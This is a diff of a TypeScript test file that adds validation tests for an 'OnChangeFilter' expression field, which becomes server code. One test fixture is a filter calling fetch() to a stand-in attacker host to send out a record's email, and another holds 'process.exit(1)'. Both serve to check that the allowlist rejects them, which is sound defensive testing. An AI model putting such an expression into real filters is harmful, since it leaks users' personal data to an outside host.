@@ -46,6 +46,7 @@ function recordProcessEntityInfo(): EntityInfo {
       { ID: 'F5', Name: 'WorkType', Type: 'nvarchar', Length: 40, AllowsNull: false, AllowUpdateAPI: true },
       { ID: 'F6', Name: 'PromptID', Type: 'uniqueidentifier', AllowsNull: true, AllowUpdateAPI: true },
       { ID: 'F7', Name: 'Configuration', Type: 'nvarchar', Length: -1, AllowsNull: true, AllowUpdateAPI: true },
+      { ID: 'F8', Name: 'OnChangeFilter', Type: 'nvarchar', Length: -1, AllowsNull: true, AllowUpdateAPI: true },
     ],
   });
 }
@@ -209,6 +210,7 @@ function recordProcess(fields: {
   Status?: 'Active' | 'Disabled' | 'Draft';
   WorkType?: 'Action' | 'Agent' | 'FieldRules' | 'Infer' | 'ML Model';
   Configuration: string | null;
+  OnChangeFilter?: string | null;
   Provider?: IEntityDataProvider;
 }): MJRecordProcessEntityExtended {
   const record = new MJRecordProcessEntityExtended(recordProcessEntityInfo(), fields.Provider || new EntityLookupDataProvider());
@@ -219,6 +221,7 @@ function recordProcess(fields: {
   record.WorkType = fields.WorkType ?? 'Infer';
   record.PromptID = 'D0000000-0000-0000-0000-000000000004';
   record.Configuration = fields.Configuration;
+  record.OnChangeFilter = fields.OnChangeFilter ?? null;
   return record;
 }
 
@@ -290,6 +293,28 @@ describe('MJRecordProcessEntityExtended.Validate (the Feature Pipeline save chec
     expect(recordProcess({ WorkType: 'FieldRules', Configuration: '{"Rules": []}' }).Validate().Success).toBe(true);
     expect(recordProcess({ Configuration: null }).Validate().Success).toBe(true);
     expect(recordProcess({ Configuration: '   ' }).Validate().Success).toBe(true);
+  });
+});
+
+describe('MJRecordProcessEntityExtended.Validate (the on-change filter becomes server code)', () => {
+  it('saves a filter over the change helpers and before/after values', () => {
+    const record = recordProcess({ WorkType: 'FieldRules', Configuration: null, OnChangeFilter: "DidFieldChangeToValue('Status', 'Approved') && NewValues.Amount > 100" });
+    expect(record.Validate().Success).toBe(true);
+  });
+
+  it('refuses a filter that reaches outside the allowlist, naming it on OnChangeFilter', () => {
+    const record = recordProcess({ WorkType: 'FieldRules', Configuration: null, OnChangeFilter: "fetch('https://attacker.example.test/?d=' + NewValues.Email)" });
+
+    const result = record.Validate();
+
+    expect(result.Success).toBe(false);
+    expect(result.Errors.map((e) => e.Source)).toEqual(['OnChangeFilter']);
+    expect(result.Errors[0].Message).toMatch(/forbidden construct/);
+  });
+
+  it('does not check a Disabled process, so one saved before the check can still be turned off', () => {
+    const record = recordProcess({ WorkType: 'FieldRules', Status: 'Disabled', Configuration: null, OnChangeFilter: 'process.exit(1)' });
+    expect(record.Validate().Success).toBe(true);
   });
 });
 
